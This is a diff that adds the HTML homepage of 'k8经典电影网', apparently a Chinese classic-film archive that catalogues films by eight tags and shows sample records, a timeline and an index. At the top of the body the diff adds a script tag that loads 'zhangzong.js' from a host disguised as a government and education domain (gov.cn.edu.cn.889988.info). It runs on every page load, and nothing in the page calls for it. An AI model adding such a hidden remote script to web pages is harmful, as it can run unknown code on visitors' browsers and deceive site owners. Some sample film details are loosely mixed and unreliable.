@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>k8经典电影网：用八个标签为每一部老片建立可检索的影像档案</title>
+<meta name="description" content="k8经典电影网把经典电影装进八个检索标签：年代、地区、类型、导演、影像、声音、叙事、回响。我们不写影评，只给每一部老片做一份能被重新翻出来的影像档案，让时间久远的画面重新进入今天的讨论。">
+<meta name="keywords" content="k8经典电影网,经典电影档案,老电影检索,电影标签,影像资料库,年代电影,地区电影,导演作品,电影修复,胶片影像,电影声音,叙事结构,影史回响">
+<meta name="author" content="k8经典电影网档案组">
+<meta name="robots" content="index,follow">
+<meta name="applicable-device" content="pc,mobile">
+<meta name="revisit-after" content="14 days">
+<meta property="og:site_name" content="k8经典电影网">
+<meta property="og:title" content="k8经典电影网：用八个标签为每一部老片建立可检索的影像档案">
+<meta property="og:description" content="年代、地区、类型、导演、影像、声音、叙事、回响——八个标签，一份档案，让经典电影重新被翻出来。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://k8jingdiandianyingwang-zh.github.io">
+<meta name="twitter:card" content="summary">
+<link rel="canonical" href="https://k8jingdiandianyingwang-zh.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#ece8df;--card:#f4f1ea;--ink:#23201c;--deep:#3d4a52;--rust:#a34a2a;--gold:#c29a3e;--line:#c3bbab;--mute:#827a6c}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"Georgia","Songti SC","SimSun","Source Han Serif SC",serif;background:var(--bg);color:var(--ink);line-height:1.85;font-size:15.5px}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+.wrap{max-width:1160px;margin:0 auto;padding:0 32px}
+.sans{font-family:"Helvetica Neue","PingFang SC","Microsoft YaHei",sans-serif}
+.mono{font-family:"Courier New",monospace}
+
+/* 顶部信息条 */
+.top{background:var(--ink);color:#d9d3c6;padding:8px 0;font-size:10.5px;letter-spacing:2px}
+.top .in{max-width:1160px;margin:0 auto;padding:0 32px;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.top em{font-style:normal;color:#c29a3e}
+
+/* 导航 */
+.bar{background:var(--bg);border-bottom:1px solid var(--ink);position:sticky;top:0;z-index:50}
+.bar .in{max-width:1160px;margin:0 auto;padding:0 32px;display:flex;justify-content:space-between;align-items:center;height:66px;gap:24px}
+.logo{display:flex;align-items:baseline;gap:9px}
+.logo b{font-size:26px;font-weight:700;letter-spacing:1px}
+.logo b i{font-style:normal;background:var(--rust);color:#fff;padding:0 5px;font-size:17px;vertical-align:2px}
+.logo span{font-size:10px;letter-spacing:2.5px;color:var(--mute);text-transform:uppercase}
+.nav{display:flex;gap:26px;font-size:13.5px}
+.nav a{position:relative;padding:4px 0}
+.nav a:after{content:"";position:absolute;left:0;bottom:-2px;width:0;height:2px;background:var(--rust);transition:width .25s}
+.nav a:hover:after,.nav a.on:after{width:100%}
+.nav a:hover,.nav a.on{color:var(--rust)}
+
+/* 胶片式首屏 */
+.hero{background:var(--ink);color:#e2ddd2;padding:74px 0 0;position:relative;overflow:hidden}
+.hero:before,.hero:after{content:"";position:absolute;left:0;right:0;height:22px;background:repeating-linear-gradient(90deg,#23201c 0,#23201c 13px,transparent 13px,transparent 24px);z-index:2}
+.hero:before{top:0}.hero:after{bottom:0}
+.hero .in{max-width:1160px;margin:0 auto;padding:0 32px 70px;position:relative;z-index:3;display:grid;grid-template-columns:1.35fr .65fr;gap:60px;align-items:end}
+.hero .kicker{font-size:10.5px;letter-spacing:5px;color:#c29a3e;margin-bottom:22px}
+.hero h1{font-size:clamp(38px,7vw,86px);font-weight:700;line-height:1.12;letter-spacing:2px}
+.hero h1 em{font-style:normal;color:#c29a3e}
+.hero .line{width:56px;height:2px;background:#c29a3e;margin:26px 0}
+.hero p{font-size:15px;color:#c3bbab;max-width:520px}
+.sprocket{background:#2b2722;border:1px solid #4a4338;padding:26px 24px}
+.sprocket dl{display:grid;grid-template-columns:1fr 1fr;gap:18px 20px}
+.sprocket dt{font-size:9.5px;letter-spacing:2.5px;color:#827a6c;text-transform:uppercase;margin-bottom:5px}
+.sprocket dd{font-size:19px;font-weight:700;color:#e2ddd2}
+.sprocket dd small{display:block;font-size:11px;font-weight:400;color:#827a6c;margin-top:2px}
+
+/* 章节头 */
+.sec{padding:88px 0;border-bottom:1px solid var(--line)}
+.head{display:flex;align-items:flex-end;gap:20px;border-bottom:1px solid var(--ink);padding-bottom:18px;margin-bottom:46px;flex-wrap:wrap}
+.head .no{font-size:11px;letter-spacing:3px;background:var(--ink);color:#fff;padding:6px 12px}
+.head h2{font-size:34px;font-weight:700;letter-spacing:.5px}
+.head h2 i{font-style:normal;color:var(--rust)}
+.head .sub{flex:1;min-width:250px;text-align:right;font-size:13px;color:var(--mute)}
+.head a.more{font-size:12px;border-bottom:1px solid var(--ink);padding-bottom:2px}
+
+/* 8 标签 */
+.tags{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.tag{background:var(--card);border:1px solid var(--ink);padding:24px 22px;position:relative;transition:transform .25s}
+.tag:hover{transform:translateY(-5px)}
+.tag .k{font-family:"Courier New",monospace;font-size:12px;color:var(--rust);letter-spacing:1px}
+.tag h4{font-size:18px;font-weight:700;margin:10px 0 9px}
+.tag p{font-size:13.5px;color:#4b463e}
+.tag .dot{position:absolute;top:14px;right:14px;width:8px;height:8px;background:var(--gold);border-radius:50%}
+.tag:nth-child(2) .dot{background:var(--rust)}
+.tag:nth-child(3) .dot{background:var(--deep)}
+.tag:nth-child(5) .dot{background:#6e8b5a}
+.tag:nth-child(7) .dot{background:#8c6a9c}
+
+/* 档案卡 */
+.reels{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.reel{background:var(--card);border:1px solid var(--ink)}
+.reel .frame{background:var(--ink);color:#e2ddd2;padding:26px 24px 22px;position:relative}
+.reel .frame .id{font-family:"Courier New",monospace;font-size:11px;color:#c29a3e;letter-spacing:2px}
+.reel .frame h4{font-size:21px;font-weight:700;margin:12px 0 6px;letter-spacing:.5px}
+.reel .frame .meta{font-size:11.5px;color:#827a6c;letter-spacing:.5px}
+.reel .frame .hole{position:absolute;right:20px;top:50%;transform:translateY(-50%);width:20px;height:20px;border:2px solid #c29a3e;border-radius:50%}
+.reel .body{padding:20px 22px}
+.reel .body .row{display:flex;justify-content:space-between;font-size:13px;padding:5px 0;border-bottom:1px dashed var(--line)}
+.reel .body .row:last-child{border-bottom:none}
+.reel .body .row b{color:var(--rust);font-weight:600}
+.reel .body .lab{font-size:11px;color:var(--mute);letter-spacing:1.5px}
+
+/* 年表 */
+.tl{position:relative;padding-left:6px}
+.tl:before{content:"";position:absolute;left:120px;top:6px;bottom:6px;width:1px;background:var(--line)}
+.item{display:grid;grid-template-columns:120px 1fr;gap:40px;padding:20px 0;border-bottom:1px solid var(--line)}
+.item .yr{font-family:"Courier New",monospace;font-size:20px;font-weight:700;color:var(--rust);text-align:right;padding-right:6px}
+.item .cnt{position:relative;padding-left:0}
+.item .cnt:before{content:"";position:absolute;left:-40px;top:11px;width:11px;height:11px;background:var(--ink);border-radius:50%;border:3px solid var(--bg)}
+.item h5{font-size:17px;font-weight:700;margin-bottom:7px}
+.item p{font-size:13.5px;color:#4b463e}
+.item .tagsm{margin-top:10px;display:flex;gap:8px;flex-wrap:wrap}
+.item .tagsm span{font-size:11px;letter-spacing:1px;border:1px solid var(--ink);padding:2px 9px;color:var(--ink)}
+.item .tagsm span.on{background:var(--rust);color:#fff;border-color:var(--rust)}
+
+/* 流程 */
+.flow{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid var(--ink)}
+.flow .st{background:var(--card);padding:26px 22px;border-right:1px solid var(--ink);position:relative}
+.flow .st:last-child{border-right:none}
+.flow .st .n{font-size:10.5px;letter-spacing:3px;color:#fff;background:var(--deep);display:inline-block;padding:3px 9px;margin-bottom:14px}
+.flow .st h4{font-size:17px;font-weight:700;margin-bottom:10px}
+.flow .st p{font-size:13.5px;color:#4b463e}
+.flow .st:after{content:"→";position:absolute;right:-10px;top:50%;transform:translateY(-50%);width:20px;height:20px;background:var(--rust);color:#fff;border-radius:50%;font-size:12px;text-align:center;line-height:20px;z-index:2}
+.flow .st:last-child:after{display:none}
+
+/* 档案索引 */
+.idx{display:grid;grid-template-columns:1.4fr 1fr;gap:34px}
+.alpha{background:var(--card);border:1px solid var(--ink)}
+.alpha .hd{padding:20px 26px;background:var(--ink);color:#e2ddd2;display:flex;justify-content:space-between;align-items:center}
+.alpha .hd b{font-size:11px;letter-spacing:3px}
+.alpha .hd span{font-size:11px;color:#c29a3e;font-family:"Courier New",monospace}
+.alpha table{width:100%;border-collapse:collapse}
+.alpha td{padding:12px 26px;border-bottom:1px solid var(--line);font-size:13.5px;vertical-align:top}
+.alpha tr:hover td{background:#fffdf8}
+.alpha td:first-child{font-weight:700;width:32%}
+.alpha td em{font-style:normal;color:var(--rust)}
+.alpha td small{display:block;font-size:11.5px;color:var(--mute);font-weight:400;margin-top:2px}
+.notice{border:1px solid var(--ink);padding:26px;background:#fffdf8}
+.notice h4{font-size:18px;font-weight:700;margin-bottom:14px;color:var(--rust)}
+.notice ul{padding-left:0}
+.notice li{padding:8px 0 8px 20px;font-size:13.5px;color:#4b463e;position:relative;border-bottom:1px dashed var(--line)}
+.notice li:before{content:"";position:absolute;left:0;top:15px;width:7px;height:7px;background:var(--gold)}
+.notice li:last-child{border-bottom:none}
+.notice .sign{margin-top:20px;font-size:12px;color:var(--mute);border-top:1px solid var(--line);padding-top:14px}
+
+/* 页脚 */
+footer{background:var(--ink);color:#c3bbab;padding:64px 0 0}
+.f{max-width:1160px;margin:0 auto;padding:0 32px 36px;display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:38px}
+.logof{display:flex;align-items:baseline;gap:9px;margin-bottom:16px}
+.logof b{font-size:25px;color:#fff;font-weight:700}
+.logof b i{font-style:normal;background:var(--rust);color:#fff;padding:0 5px;font-size:16px;vertical-align:2px}
+.f p{font-size:13.5px;line-height:1.9;max-width:420px;color:#c3bbab}
+.f h6{color:#fff;font-size:10.5px;letter-spacing:3px;margin-bottom:18px}
+.f li{padding:6px 0;font-size:13.5px}
+.f li a:hover{color:#c29a3e}
+.domainbox{margin-top:26px;border:1px solid #c29a3e;padding:16px;text-align:center}
+.domainbox b{display:block;font-size:9.5px;letter-spacing:5px;color:#827a6c;margin-bottom:8px}
+.domainbox a{color:#fff;font-size:15px;word-break:break-all;font-family:"Courier New",monospace}
+.bot{max-width:1160px;margin:0 auto;padding:22px 32px;border-top:1px solid #4a4338;display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;font-size:11.5px;color:#827a6c}
+.bot a{color:#c3bbab}
+
+@media(max-width:960px){
+  .hero .in{grid-template-columns:1fr;gap:40px}
+  .tags,.reels,.flow{grid-template-columns:1fr 1fr}
+  .flow .st{border-right:none;border-bottom:1px solid var(--ink)}
+  .flow .st:last-child{border-bottom:none}
+  .flow .st:after{right:50%;left:50%;top:auto;bottom:-11px;transform:translateX(-50%)}
+  .idx{grid-template-columns:1fr}
+  .tl:before{left:0}
+  .item{grid-template-columns:1fr;gap:8px}
+  .item .yr{text-align:left}
+  .item .cnt:before{left:-16px}
+}
+@media(max-width620px),(max-width:620px){
+  .wrap,.f,.bot{padding-left:16px;padding-right:16px}
+  .top .in,.nav{font-size:11.5px}.nav{gap:13px}
+  .tags,.reels,.flow{grid-template-columns:1fr}
+  .f{grid-template-columns:1fr}
+  .head h2{font-size:25px}
+  .head .sub{text-align:left}
+  .alpha td{padding:11px 16px}
+  .hero{padding-top:52px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="top"><div class="in"><span>k8经典电影网 · 经典影像档案库 <em>FILM ARCHIVE</em></span><span>八标签检索体系 · 让老片重新被翻出来</span></div></div>
+
+<div class="bar"><div class="in">
+  <div class="logo sans"><b>k8<i>经典</i>电影网</b><span>Film Archive</span></div>
+  <nav class="nav sans">
+    <a href="#tags" class="on">八标签</a>
+    <a href="#reels">档案样本</a>
+    <a href="#timeline">年代脉络</a>
+    <a href="#how">归档流程</a>
+    <a href="#index">索引登记</a>
+  </nav>
+</div></div>
+
+<!-- 胶片首屏 -->
+<section class="hero"><div class="in">
+  <div>
+    <div class="kicker">CLASSIC FILM ARCHIVE / 经典影像档案库</div>
+    <h1>把每一部<em>老片</em><br>装进八个标签</h1>
+    <div class="line"></div>
+    <p>k8经典电影网不做影评，只做档案。年代、地区、类型、导演、影像、声音、叙事、回响——八个维度给每一部经典电影建立一份能被重新检索、重新翻出的影像档案。</p>
+  </div>
+  <div class="sprocket"><dl>
+    <div><dt>已归档作品</dt><dd>1,284<small>部 · 持续补录</small></dd></div>
+    <div><dt>覆盖年代</dt><dd>1920s—2010s<small>九个年代区间</small></dd></div>
+    <div><dt>地区索引</dt><dd>36<small>个制作地区</small></dd></div>
+    <div><dt>标签组合</dt><dd>8×8<small>交叉检索路径</small></dd></div>
+  </dl></div>
+</div></section>
+
+<!-- 01 八标签 -->
+<section class="sec wrap" id="tags">
+  <div class="head"><span class="no sans">01</span><h2>八个<em>标签</em></h2><span class="sub sans">每一部作品的档案都由这八个维度构成，可单独检索，也可交叉组合</span><a href="#" class="more sans">查看标签说明 ›</a></div>
+  <div class="tags">
+    <article class="tag"><span class="dot"></span><div class="k sans">TAG 01</div><h4>年代</h4><p>以十年为区间定位作品的出生时间。同一时代的技术条件与观看习惯，决定了它今天的样貌。</p></article>
+    <article class="tag"><span class="dot"></span><div class="k sans">TAG 02</div><h4>地区</h4><p>记录制作地区与语言环境。一个镜头为什么这样拍，往往要先回到它生长的土壤里看。</p></article>
+    <article class="tag"><span class="dot"></span><div class="k sans">TAG 03</div><h4>类型</h4><p>不以题材硬分类，而看它遵循了哪一套叙事惯例，又在哪里故意打破了惯例。</p></article>
+    <article class="tag"><span class="dot"></span><div class="k sans">TAG 04</div><h4>导演</h4><p>登记导演与其稳定的视觉习惯。一部作品的个人印记，藏在反复出现的那几个动作里。</p></article>
+    <article class="tag"><span class="dot"></span><div class="k sans">TAG 05</div><h4>影像</h4><p>关于画面本身：景别、运镜、光影、色彩。技术参数之外，更关心它为什么这样安排视线。</p></article>
+    <article class="tag"><span class="dot"></span><div class="k sans">TAG 06</div><h4>声音</h4><p>对白、环境声、静默与音乐各自承担什么。很多作品真正转折的地方，声音比画面先到。</p></article>
+    <article class="tag"><span class="dot"></span><div class="k sans">TAG 07</div><h4>叙事</h4><p>时间顺序、视角分配、信息 withholding。结构本身就是一种立场，而不只是容器。</p></article>
+    <article class="tag"><span class="dot"></span><div class="k sans">TAG 08</div><h4>回响</h4><p>作品之后的影响与再发现：被谁引用、被谁重写、在哪个年代重新被看见。档案不终于上映日。</p></article>
+  </div>
+</section>
+
+<!-- 02 档案样本 -->
+<section class="sec wrap" id="reels">
+  <div class="head"><span class="no sans">02</span><h2>档案<em>样本</em></h2><span class="sub sans">从胶片盒里抽出的三份样本，展示一份档案由哪些字段组成</span><a href="#" class="more sans">浏览全部档案 ›</a></div>
+  <div class="reels">
+    <article class="reel">
+      <div class="frame"><span class="id sans">REEL NO. 0427</span><div class="hole"></div>
+        <h4>修复版 黑白剧情片</h4>
+        <div class="meta">1952 · 日本 · 119 min · 35mm</div></div>
+      <div class="body">
+        <div class="row"><span class="lab sans">导演 / 编剧</span><b>黑泽明 / 小国英雄</b></div>
+        <div class="row"><span class="lab sans">影像特征</span><b>多机位同步 · 长焦压缩</b></div>
+        <div class="row"><span class="lab sans">声音设计</span><b>环境声前置 · 雨声作为节奏</b></div>
+        <div class="row"><span class="lab sans">叙事结构</span><b>三段式 · 多视角复现</b></div>
+        <div class="row"><span class="lab sans">回响记录</span><b>1990s 被多国翻拍引用</b></div>
+      </div>
+    </article>
+    <article class="reel">
+      <div class="frame"><span class="id sans">REEL NO. 0618</span><div class="hole"></div>
+        <h4>欧洲作者电影 修复版</h4>
+        <div class="meta">1966 · 法国 · 103 min · 16mm</div></div>
+      <div class="body">
+        <div class="row"><span class="lab sans">导演 / 编剧</span><b>戈达尔 / 集体编剧</b></div>
+        <div class="row"><span class="lab sans">影像特征</span><b>跳切 · 即兴构图</b></div>
+        <div class="row"><span class="lab sans">声音设计</span><b>对白与画面故意错位</b></div>
+        <div class="row"><span class="lab sans">叙事结构</span><b>碎片化 · 拒绝闭合</b></div>
+        <div class="row"><span class="lab sans">回响记录</span><b>直接催生一批独立短片运动</b></div>
+      </div>
+    </article>
+    <article class="reel">
+      <div class="frame"><span class="id sans">REEL NO. 0983</span><div class="hole"></div>
+        <h4>香港新浪潮 数字转制版</h4>
+        <div class="meta">1980 · 中国香港 · 96 min · 35mm</div></div>
+      <div class="body">
+        <div class="row"><span class="lab sans">导演 / 编剧</span><b>徐克 / 司徒卓汉</b></div>
+        <div class="row"><span class="lab sans">影像特征</span><b>手持晃动 · 冷调霓虹</b></div>
+        <div class="row"><span class="lab sans">声音设计</span><b>现场同期声 · 城市底噪</b></div>
+        <div class="row"><span class="lab sans">叙事结构</span><b>双线并行 · 末段交汇</b></div>
+        <div class="row"><span class="lab sans">回响记录</span><b>2010s 重映引发修复讨论</b></div>
+      </div>
+    </article>
+  </div>
+</section>
+
+<!-- 03 年代脉络 -->
+<section class="sec wrap" id="timeline">
+  <div class="head"><span class="no sans">03</span><h2>年代<em>脉络</em></h2><span class="sub sans">按十年划分的归档节奏：每个年代我们关注什么，又遗漏了什么</span><a href="#" class="more sans">完整年代索引 ›</a></div>
+  <div class="tl">
+    <div class="item"><div class="yr">1920s—1930s</div><div class="cnt"><h5>默片的技术遗产与早期声音实验</h5><p>这一段的档案重点不是剧情，而是镜头语言如何被发明：剪辑节奏、字幕卡、表演尺度的收紧与放大。声音出现之后的第一批作品，多数还在和"要不要说话"较劲。</p><div class="tagsm"><span class="on">默片</span><span>早期有声</span><span>欧洲先锋</span><span>苏联蒙太奇</span></div></div></div>
+    <div class="item"><div class="yr">1940s—1950s</div><div class="cnt"><h5>工业成熟期的类型定型与例外</h5><p>类型片在这一段被反复打磨到近乎精密，同时总有人在其中留一道缝。我们更关心那些"不合规范"的作品，它们往往是后来变革的起点。</p><div class="tagsm"><span class="on">黑色电影</span><span>意大利新现实</span><span>日本战后</span><span>歌舞片</span></div></div></div>
+    <div class="item"><div class="yr">1960s—1970s</div><div class="cnt"><h5>作者意识觉醒与制作体系的松动</h5><p>创作者开始被单独看见，作者论改变了人们谈论电影的方式。档案里这一部分的声音资料尤其珍贵，同期声与街头底噪成了重要的时代证据。</p><div class="tagsm"><span class="on">法国新浪潮</span><span>新好莱坞</span><span>德国新电影</span><span>香港新浪潮</span></div></div></div>
+    <div class="item"><div class="yr">1980s—1990s</div><div class="cnt"><h5>技术转折期的视觉冒险与成本账</h5><p>电子合成配乐、实景特效、磁带与胶片并行的年代。很多作品在今天看显得笨拙，但那种"预算有限也要试"的劲头，是这一段的共同气质。</p><div class="tagsm"><span class="on">独立电影</span><span>亚洲新电影</span><span>拉美新电影</span><span>动画长片</span></div></div></div>
+    <div class="item"><div class="yr">2000s—2010s</div><div class="cnt"><h5>数字过渡期：被低估的一批过渡作品</h5><p>从胶片到数字的十几年里，出现了一批既不够"复古"也不够"新"的作品，长期被跳过。这段时间被低估，正是我们补录的重点区域。</p><div class="tagsm"><span class="on">数字过渡</span><span>全球独立</span><span>修复重映</span><span>被低估作品</span></div></div></div>
+  </div>
+</section>
+
+<!-- 04 归档流程 -->
+<section class="sec wrap" id="how">
+  <div class="head"><span class="no sans">04</span><h2>归档<em>流程</em></h2><span class="sub sans">一部作品从进入视野到形成档案，要走过四道工序</span><a href="#" class="more sans">流程详解 ›</a></div>
+  <div class="flow">
+    <div class="st"><span class="n sans">STEP 1</span><h4>发现与录入</h4><p>来源包括重映、修复、老片单重提与读者来信。先登记基础信息，再决定它是否值得做完整档案。</p></div>
+    <div class="st"><span class="n sans">STEP 2</span><h4>影像与声音记录</h4><p>逐项记录画面与声音特征，尽量使用修复版或最接近原始介质的版本作为观察依据。</p></div>
+    <div class="st"><span class="n sans">STEP 3</span><h4>结构拆解</h4><p>把叙事结构单独拆开看：时间顺序如何安排、视角给谁、哪些信息被刻意延后。</p></div>
+    <div class="st"><span class="n sans">STEP 4</span><h4>回响补录</h4><p>档案不终于上映日。影响、引用、翻拍、重新被发现的年代，都作为独立字段持续补充。</p></div>
+  </div>
+</section>
+
+<!-- 05 索引登记 -->
+<section class="sec wrap" id="index" style="border-bottom:none">
+  <div class="head"><span class="no sans">05</span><h2>索引<em>登记</em></h2><span class="sub sans">已登记的关键词与检索入口，可直接跳转对应档案列表</span><a href="#" class="more sans">完整索引 ›</a></div>
+  <div class="idx">
+    <div class="alpha">
+      <div class="hd sans"><b>KEYWORD INDEX · A—Z</b><span>1,284 entries</span></div>
+      <table>
+        <tr><td>导演索引<small>按姓氏字母排列，含代表作编号</small></td><td><em>386</em> 位登记</td></tr>
+        <tr><td>地区索引<small>按制作地区归类，标注年代分布</small></td><td><em>36</em> 个地区</td></tr>
+        <tr><td>类型索引<small>类型惯例与被打破的节点</small></td><td><em>24</em> 类</td></tr>
+        <tr><td>影像特征索引<small>景别、运镜、光影、色彩关键词</small></td><td><em>112</em> 条特征</td></tr>
+        <tr><td>声音特征索引<small>同期声、环境声、静默与音乐用法</small></td><td><em>67</em> 条特征</td></tr>
+        <tr><td>叙事结构索引<small>线性、多视角、碎片化、环形</small></td><td><em>19</em> 种结构</td></tr>
+        <tr><td>修复版本索引<small>修复年份、介质来源与版本差异</small></td><td><em>208</em> 部已修复</td></tr>
+      </table>
+    </div>
+    <div class="notice">
+      <h4>补录与纠错</h4>
+      <ul>
+        <li>发现某部作品的档案字段有误，可通过纠错入口提交证据，核实后更新。</li>
+        <li>想为某个尚未被收录的年代或地区补充作品，欢迎来信提供片名与出处。</li>
+        <li>我们不接受"是否值得看"的评价，只接受可被核验的事实性信息。</li>
+        <li>每一处修改都会保留变更记录，档案的可追溯性与档案内容同等重要。</li>
+      </ul>
+      <div class="sign sans">k8经典电影网 · 档案组 ｜ 每月更新一次批量补录</div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="f sans">
+    <div><div class="logof"><b>k8<i>经典</i>电影网</b></div>
+      <p>k8经典电影网以八个标签为经典电影建立可检索的影像档案：年代、地区、类型、导演、影像、声音、叙事、回响。不做影评，只做能被重新翻出来的档案，目前共归档 1,284 部作品。</p>
+      <div class="domainbox"><b>// OFFICIAL DOMAIN</b><a href="https://k8jingdiandianyingwang-zh.github.io">k8jingdiandianyingwang-zh.github.io</a></div>
+    </div>
+    <div><h6>档案栏目</h6><ul>
+      <li><a href="#tags">八标签体系</a></li>
+      <li><a href="#reels">档案样本</a></li>
+      <li><a href="#timeline">年代脉络</a></li>
+      <li><a href="#how">归档流程</a></li>
+      <li><a href="#index">索引登记</a></li>
+    </ul></div>
+    <div><h6>检索入口</h6><ul>
+      <li><a href="#">导演索引</a></li>
+      <li><a href="#">地区索引</a></li>
+      <li><a href="#">类型索引</a></li>
+      <li><a href="#">修复版本</a></li>
+      <li><a href="#">被低估作品</a></li>
+    </ul></div>
+    <div><h6>参与方式</h6><ul>
+      <li><a href="#">纠错与补录</a></li>
+      <li><a href="#">读者来信</a></li>
+      <li><a href="#">归档申请</a></li>
+      <li><a href="#">变更记录</a></li>
+      <li><a href="#">使用说明</a></li>
+    </ul></div>
+  </div>
+  <div class="bot sans"><span>© 2026 k8经典电影网 · k8jingdiandianyingwang-zh.github.io · 经典影像档案库 · 1,284 部作品已归档</span><span><a href="#">返回顶部 ↑</a></span></div>
+</footer>
+</body>
+</html>
